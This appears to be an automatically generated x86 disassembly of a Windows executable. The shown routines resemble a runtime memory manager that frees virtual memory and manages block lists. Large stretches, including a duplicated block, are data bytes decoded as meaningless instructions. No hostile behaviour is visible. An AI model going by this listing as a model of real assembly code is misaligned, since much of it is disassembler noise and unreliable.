sub_4010e4
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
mov eax eax
clc
adc [ eax ] al
or al [ esi ]
push ebx
je r-xdata
add al 0xf8
je r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
adc al 0x11
inc eax
add [ edi + eax ] cl
inc esp
and al 0x4
clc
jmp sub_405a78
insd
add [ eax ] al
test al 0x11
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
popad
outsb
je r-xdata
jmp sub_405aa0
jb r-xdata
push esi
popad
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
nop
mov al 0x10
inc eax
add [ esi + eax ] al
inc esp
outsd
jne r-xdata
inc eax
add [ ecx + edx ] ah
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
jb r-xdata
insb
add [ gs : ebp + 0x10c00040 ] ecx
inc eax
add [ eax + ecx ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
add [ eax ] al
add [ eax ] al
inc esi
and eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12a00040 ] cl
inc eax
add [ ecx ] dh
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004012 ]
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
je r-xdata
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bh
jb r-xdata
je r-xdata
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add eax [ eax ]
imul esp [ ecx + 0x6e ] 0x40117c74
add [ eax ] al
add [ eax ] al
outsb
arpl [ ecx + 0x4 ] di
nop
rcl [ eax ] 0x1
inc eax
add [ ebx ] al
or [ edi + 0x6f ] dl
jb r-xdata
inc eax
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 4 + 0x11 ] si
inc eax
add [ edi ] al
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
inc eax
mov ah 0xb1
inc edi
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
mov eax 0x11004012
or edx [ edx + eax * 2 + 0x6f ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
outsd
outsd
insb
add al [ eax ]
add [ eax ] al
cmp bh 0xff
and eax FindClose@IAT
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_0(kernel32:FindFirstFileA)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_40134c
add [ eax ] al
add [ eax ] al
je r-xdata
add [ ebx - 0x5fda0040 ] cl
mov cl 0x47
add [ ebx - 0x63da0040 ] cl
mov cl 0x47
add [ ebx - 0x67da0040 ] cl
mov cl 0x47
add [ ebx - 0x6bda0040 ] cl
mov cl 0x47
add [ ebx - 0x6fda0040 ] cl
mov cl 0x47
add [ ebx - 0x73da0040 ] cl
mov cl 0x47
add [ ebx - 0x77da0040 ] cl
mov cl 0x47
add [ ebx - 0x7bda0040 ] cl
mov cl 0x47
add [ ebx - 0x2fda0040 ] cl
mov cl 0x47
add [ ebx - 0x7fda0040 ] cl
mov cl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x47
add [ ebx - 0x17da0040 ] cl
mov cl 0x47
add [ ebx - 0x1bda0040 ] cl
mov cl 0x47
add [ ebx - 0x1fda0040 ] cl
mov cl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x47
add [ ebx - 0x7da0040 ] cl
mov cl 0x47
add [ ebx - 0xbda0040 ] cl
mov cl 0x47
add [ ebx - 0xfda0040 ] cl
mov cl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x47
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
inc edi
insd
loopne r-xdata
add [ ebx - 0x27da0040 ] cl
mov cl 0x47
add [ ebx - 0x4fda0040 ] cl
mov cl 0x47
add [ ebx - 0x2bda0040 ] cl
mov cl 0x47
add [ ebx - 0x53da0040 ] cl
mov cl 0x47
add [ ebx - 0x57da0040 ] cl
mov cl 0x47
add [ ebx - 0x5bda0040 ] cl
mov cl 0x47
inc edi
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_40134c
add [ ebx - 0x3fda0040 ] cl
mov cl 0x47
add [ ebx - 0x43da0040 ] cl
mov cl 0x47
add [ ebx - 0x47da0040 ] cl
mov cl 0x47
add [ ebx - 0x4bda0040 ] cl
mov cl 0x47
push esp
imul ebp [ ebp + 0x65 ] 0xc425ff01
mov cl 0x47
sub_401225
add eax 0xf004012
adc al [ eax ]
sbb [ edx ] edx
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
and eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12a00040 ] cl
inc eax
add [ ecx ] dh
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004012 ]
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
mov ah 0xb1
inc edi
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
mov eax 0x11004012
or edx [ edx + eax * 2 + 0x6f ]
jne r-xdata
and eax FindClose@IAT
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_0(kernel32:FindFirstFileA)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_40134c
add [ eax ] al
add [ eax ] al
je r-xdata
add [ ebx - 0x5fda0040 ] cl
mov cl 0x47
add [ ebx - 0x63da0040 ] cl
mov cl 0x47
add [ ebx - 0x67da0040 ] cl
mov cl 0x47
add [ ebx - 0x6bda0040 ] cl
mov cl 0x47
add [ ebx - 0x6fda0040 ] cl
mov cl 0x47
add [ ebx - 0x73da0040 ] cl
mov cl 0x47
add [ ebx - 0x77da0040 ] cl
mov cl 0x47
add [ ebx - 0x7bda0040 ] cl
mov cl 0x47
add [ ebx - 0x2fda0040 ] cl
mov cl 0x47
add [ ebx - 0x7fda0040 ] cl
mov cl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x47
add [ ebx - 0x17da0040 ] cl
mov cl 0x47
add [ ebx - 0x1bda0040 ] cl
mov cl 0x47
add [ ebx - 0x1fda0040 ] cl
mov cl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x47
add [ ebx - 0x7da0040 ] cl
mov cl 0x47
add [ ebx - 0xbda0040 ] cl
mov cl 0x47
add [ ebx - 0xfda0040 ] cl
mov cl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x47
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
inc edi
insd
loopne r-xdata
add [ ebx - 0x27da0040 ] cl
mov cl 0x47
add [ ebx - 0x4fda0040 ] cl
mov cl 0x47
add [ ebx - 0x2bda0040 ] cl
mov cl 0x47
add [ ebx - 0x53da0040 ] cl
mov cl 0x47
add [ ebx - 0x57da0040 ] cl
mov cl 0x47
add [ ebx - 0x5bda0040 ] cl
mov cl 0x47
inc edi
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_40134c
add [ ebx - 0x3fda0040 ] cl
mov cl 0x47
add [ ebx - 0x43da0040 ] cl
mov cl 0x47
add [ ebx - 0x47da0040 ] cl
mov cl 0x47
add [ ebx - 0x4bda0040 ] cl
mov cl 0x47
push esp
imul ebp [ ebp + 0x65 ] 0xc425ff01
mov cl 0x47
sub_401468
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401428
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4014c0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401468
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401508
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014f0
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014f0
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4014c0
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401578
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4014c0
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014f0
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40160c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014c0
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401438
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401670
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401438
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401438
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014c0
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4016e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014f0
mov [ rw-data ] 0x1
sub_4017a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401438
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401834
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4018b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40160c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4017a0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401508
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016e8
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014f0
jmp r-xdata
sub_401944
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401670
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401508
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401670
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016e8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401508
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4017a0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016e8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014f0
jmp r-xdata
sub_401a68
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401834
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401508
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016e8
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401578
jmp r-xdata
sub_401af4
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401baa
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401448
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
push 0xff8
push 0x0
call sub_401428
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401bb1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401458
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401bb8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c8e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401450
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401460
retn
push rw-data
call sub_401458
sub_401c98
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401cfc
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401d2c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401f00
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d80
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d5c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401da8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c98
add ebx esi
mov [ rw-data ] 0x6
sub_401e18
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c98
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401cfc
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a68
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a68
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401d2c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401578
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d80
sub_401f00
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
